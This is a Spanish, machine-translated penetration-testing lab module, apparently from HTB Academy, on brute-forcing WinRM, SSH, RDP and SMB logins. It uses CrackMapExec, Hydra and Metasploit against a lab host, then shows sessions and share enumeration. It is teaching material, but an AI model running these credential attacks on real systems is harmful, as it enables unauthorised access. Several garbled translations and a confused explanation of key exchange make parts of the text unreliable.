# Servicios de red

Durante nuestras pruebas de penetración, cada red de computadoras que encontramos tendrá servicios instalados para administrar, editar o crear contenido. Todos estos servicios están alojados utilizando permisos específicos y se asignan a usuarios específicos. Además de las aplicaciones web, estos servicios incluyen (pero no se limitan a):

|  |  |  |
| --- | --- | --- |
| Ftp | SMB | NFS |
| IMAP/POP3 | Ssh | Mysql/mssql |
| RDP | Winrm | VNC |
| Telnet | Smtp | Ldap |

Para leer más sobre muchos de estos servicios, consulte el[Huella](https://academy.hackthebox.com/course/preview/footprinting)Módulo en HTB Academy.

Imaginemos que queremos administrar un servidor de Windows a través de la red. En consecuencia, necesitamos un servicio que nos permita acceder al sistema, ejecutar comandos o acceder a su contenido a través de una GUI o la terminal. En este caso, los servicios más comunes adecuados para esto son`RDP`, `WinRM`, y`SSH`. SSH ahora es mucho menos común en Windows, pero es el servicio líder para los sistemas basados en Linux.

Todos estos servicios tienen un mecanismo de autenticación utilizando un nombre de usuario y contraseña. Por supuesto, estos servicios pueden modificarse y configurarse para que solo se puedan usar claves predefinidas para iniciar sesión, pero se configuran con configuraciones predeterminadas en muchos casos.

---

# **Winrm**

[Administración remota de Windows](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) es la implementación de Microsoft del protocolo de red[Protocolo de gestión de servicios web](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). Es un protocolo de red basado en servicios web XML utilizando el[Protocolo simple de acceso a objetos](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) utilizado para la administración remota de los sistemas de Windows. Se encarga de la comunicación entre[Gestión empresarial basada en la web](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) y el[Instrumentación de administración de Windows](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), que puede llamar al[Modelo de objeto de componente distribuido](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

Sin embargo, por razones de seguridad, WinRM debe activarse y configurarse manualmente en Windows 10. Por lo tanto, depende en gran medida de la seguridad del entorno en un dominio o red local donde queremos usar WinRM. En la mayoría de los casos, uno usa certificados o solo mecanismos de autenticación específicos para aumentar su seguridad. WinRM usa los puertos TCP`5985` (`HTTP`) y`5986` (`HTTPS`).

Una herramienta útil que podemos usar para nuestros ataques de contraseña es[Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec), que también se puede utilizar para otros protocolos como SMB, LDAP, MSSQL y otros. Recomendamos leer el[documentación oficial](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/)para que esta herramienta se familiarice con ella.

### **Crackmapexec**

### **Instalación de CrackMapexec**

Podemos instalar`CrackMapExec`a través de apt en un host o clon[Repositorio de Github](https://github.com/byt3bl33d3r/CrackMapExec)y sigue a los diversos[instalación](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation)Métodos, como instalar desde la fuente y evitar problemas de dependencia.

Servicios de red

```
xnoxos@htb[/htb]$ sudo apt-get -y install crackmapexec
```

Nota: Alternativamente, podemos instalar[NetExec](https://github.com/Pennyw0rth/NetExec)Para seguir usando`sudo apt-get -y install netexec`

### **Opciones de menú CrackMapexec**

Ejecutando la herramienta con el`-h`Flag nos mostrará instrucciones de uso general y algunas opciones disponibles para nosotros.

Servicios de red

```
xnoxos@htb[/htb]$  crackmapexec -husage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT]
                    [--jitter INTERVAL] [--darrell]
                    [--verbose]
                    {mssql,smb,ssh,winrm} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {mssql,smb,ssh,winrm}
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM

```

### **Ayuda específica del protocolo de CrackMapexec**

Tenga en cuenta que podemos especificar un protocolo específico y recibir un menú de ayuda más detallado de todas las opciones disponibles para nosotros. CrackMapexec actualmente admite autenticación remota utilizando MSSQL, SMB, SSH y WinRM.

Servicios de red

```
xnoxos@htb[/htb]$ crackmapexec smb -husage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]]
                        [-k] [--aesKey] [--kdcHost] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
                        [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}]
                        [--server-host HOST] [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce]
                        [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--gen-relay-list OUTPUT_FILE]
                        [--continue-on-success] [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions]
                        [--disks] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--local-groups [GROUP]]
                        [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE]
                        [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE]
                        [--exec-method {atexec,wmiexec,smbexec,mmcexec}] [--force-ps32] [--no-output]
                        [-x COMMAND | -X PS_COMMAND] [--obfs] [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
                        targets, NMap XML or .Nessus file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)

<SNIP>

```

### **Uso de crackmapexec**

El formato general para usar CrackMapexec es el siguiente:

Servicios de red

```
xnoxos@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

```

Servicios de red

```
xnoxos@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.listWINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)

```

La aparición de`(Pwn3d!)`es el signo de que probablemente podamos ejecutar comandos del sistema si iniciamos sesión con el usuario forzado con bruto. Otra herramienta útil que podemos usar para comunicarnos con el servicio WinRM es[Evil-Winrm](https://github.com/Hackplayers/evil-winrm), que nos permite comunicarnos con el servicio WinRM de manera eficiente.

### **Evil-Winrm**

### **Instalación de Evil-Winrm**

Servicios de red

```
xnoxos@htb[/htb]$ sudo gem install evil-winrmFetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)

```

### **Uso de malvado-ganado**

Network Services

```
xnoxos@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>

```

Servicios de red

```
xnoxos@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p passwordEvil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>

```

Si el inicio de sesión fue exitoso, una sesión terminal se inicializa utilizando el[PowerShell Protocolo a discurso](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), que simplifica la operación y la ejecución de los comandos.

---

# **Ssh**

[Shell seguro](https://www.ssh.com/academy/ssh/protocol) (`SSH`) es una forma más segura de conectarse a un host remoto para ejecutar comandos del sistema o transferir archivos de un host a un servidor. El servidor SSH se ejecuta en`TCP port 22`Por defecto, al que podemos conectarnos usando un cliente SSH. Este servicio utiliza tres operaciones/métodos de criptografía diferentes:`symmetric`cifrado,`asymmetric`cifrado y`hashing`.

### **Cifrado simétrico**

El cifrado simétrico utiliza el`same key`para cifrado y descifrado. Sin embargo, cualquiera que tenga acceso a la clave también podría acceder a los datos transmitidos. Por lo tanto, se necesita un procedimiento de intercambio de claves para un cifrado simétrico seguro. El[Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)El método de intercambio de claves se utiliza para este propósito. Si un tercero obtiene la clave, no puede descifrar los mensajes porque se desconoce el método de intercambio de claves. Sin embargo, esto es utilizado por el servidor y el cliente para determinar la clave secreta necesaria para acceder a los datos. Se pueden usar muchas variantes diferentes del sistema de cifrado simétrico, como AES, Blowfish, 3Des, etc.

### **Cifrado asimétrico**

Utiliza el cifrado asimétrico`two SSH keys`: una clave privada y una clave pública. La clave privada debe permanecer en secreto porque solo puede descifrar los mensajes que se han encriptado con la clave pública. Si un atacante obtiene la clave privada, que a menudo no está protegida con contraseña, podrá iniciar sesión en el sistema sin credenciales. Una vez que se establece una conexión, el servidor utiliza la clave pública para la inicialización y la autenticación. Si el cliente puede descifrar el mensaje, tiene la clave privada y la sesión SSH puede comenzar.

### **Chava**

El método Hashing convierte los datos transmitidos en otro valor único. SSH usa hashing para confirmar la autenticidad de los mensajes. Este es un algoritmo matemático que solo funciona en una dirección.

### **Hydra - SSH**

Podemos usar una herramienta como`Hydra`a la fuerza bruta ssh. Esto está cubierto en profundidad en el[Iniciar forcedura de bruto](https://academy.hackthebox.com/course/preview/login-brute-forcing)módulo.

Servicios de red

```
xnoxos@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found

```

Para iniciar sesión en el sistema a través del protocolo SSH, podemos usar el cliente OpenSSH, que está disponible de forma predeterminada en la mayoría de las distribuciones de Linux.

Servicios de red

```
xnoxos@htb[/htb]$ ssh user@10.129.42.197The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.

user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>

```

---

# **Protocolo de escritorio remoto (RDP)**

Microsoft's[Protocolo de escritorio remoto](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) es un protocolo de red que permite el acceso remoto a los sistemas de Windows a través de`TCP port 3389`por defecto. RDP proporciona a los usuarios y a los administradores/personal de soporte acceso remoto a los hosts de Windows dentro de una organización. El protocolo de escritorio remoto define a dos participantes para una conexión: un llamado servidor terminal, en el que se lleva a cabo el trabajo real y un cliente terminal, a través del cual el servidor terminal está controlado de forma remota. Además del intercambio de imágenes, sonido, teclado y dispositivo de señalización, el RDP también puede imprimir documentos del servidor terminal en una impresora conectada al cliente terminal o permitir el acceso a los medios de almacenamiento disponibles allí. Técnicamente, el RDP es un protocolo de capa de aplicación en la pila IP y puede usar TCP y UDP para la transmisión de datos. El protocolo es utilizado por varias aplicaciones oficiales de Microsoft, pero también se usa en algunas soluciones de terceros.

### **Hydra - RDP**

También podemos usar`Hydra`Para realizar el Forceing Brute de RDP.

Servicios de red

```
xnoxos@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found

```

Linux ofrece diferentes clientes para comunicarse con el servidor deseado utilizando el protocolo RDP. Estos incluyen[Remmina](https://remmina.org/), [rdesktop](http://www.rdesktop.org/), [xfreerdp](https://linux.die.net/man/1/xfreerdp), y muchos otros. Para nuestros propósitos, trabajaremos con xfreerdp.

### **xfreerdp**

Servicios de red

```
xnoxos@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>

```

Servicios de red

```
xnoxos@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password...SNIP...
New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y

```

![](https://academy.hackthebox.com/storage/modules/147/RDP.png)

---

# **SMB**

[Bloque de mensajes del servidor](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) es un protocolo responsable de transferir datos entre un cliente y un servidor en las redes de área local. Se utiliza para implementar servicios de intercambio e impresión de archivos y directorio en redes de Windows. SMB a menudo se conoce como un sistema de archivos, pero no lo es. SMB se puede comparar con`NFS`para Unix y Linux para proporcionar unidades en redes locales.

SMB también se conoce como[Sistema común de archivos de Internet](https://cifs.com/) (`CIFS`). Es parte del protocolo SMB y permite una conexión remota universal de múltiples plataformas como Windows, Linux o MacOS. Además, a menudo nos encontraremos[Samba](https://wiki.samba.org/index.php/Main_Page), que es una implementación de código abierto de las funciones anteriores. Para SMB, también podemos usar`hydra`Nuevamente para probar diferentes nombres de usuario en combinación con diferentes contraseñas.

### **Hydra - SMB**

Servicios de red

```
xnoxos@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found

```

Sin embargo, también podemos recibir el siguiente error que describe que el servidor ha enviado una respuesta no válida.

### **Hydra - Error**

Servicios de red

```
xnoxos@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/

```

Esto se debe a que lo más probable es que tengamos una versión obsoleta de THC-Hydra que no pueda manejar las respuestas de SMBV3. Para resolver este problema, podemos actualizar y recompilar manualmente`hydra`o usar otra herramienta muy poderosa, la[Marco de metasploit](https://www.metasploit.com/).

### **Marco de metasploit**

Servicios de red

```
xnoxos@htb[/htb]$ msfconsole -qmsf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list

msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list

msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Ahora podemos usar`CrackMapExec`Nuevamente para ver las acciones disponibles y qué privilegios tenemos para ellos.

### **Crackmapexec**

Servicios de red

```
xnoxos@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --sharesSMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote AdminSMB         10.129.42.197   445    WINSRV           C$                              Default shareSMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

Para comunicarnos con el servidor a través de SMB, podemos usar, por ejemplo, la herramienta[smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). Esta herramienta nos permitirá ver el contenido de las acciones, cargar o descargar archivos si nuestros privilegios lo permiten.

### **Smbclient**

Servicios de red

```
xnoxos@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAMEEnter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.

smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \>

```

**`Note:`**Para completar las preguntas de desafío, asegúrese de descargar las listas de palabras proporcionadas de los recursos en la parte superior de la página